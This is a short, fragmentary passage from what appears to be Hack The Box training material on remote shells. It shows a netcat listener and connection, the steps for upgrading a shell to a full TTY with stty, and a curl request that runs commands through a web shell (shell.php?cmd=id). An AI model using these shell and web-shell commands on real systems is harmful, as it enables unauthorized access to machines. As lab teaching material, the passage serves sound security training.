...
```
xnoxos@htb[/htb]$ nc -lvnp 1234listening on [any] 1234 ...
...
```
xnoxos@htb[/htb]$ nc 10.10.10.1 1234id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
...
```
www-data@remotehost$ ^Zxnoxos@htb[/htb]$ stty raw -echoxnoxos@htb[/htb]$ fg[Enter]
[Enter]
www-data@remotehost$
...
```
xnoxos@htb[/htb]$ echo $TERMxterm-256color
...
```
xnoxos@htb[/htb]$ stty size67 318
...
```
xnoxos@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=iduid=33(www-data) gid=33(www-data) groups=33(www-data)
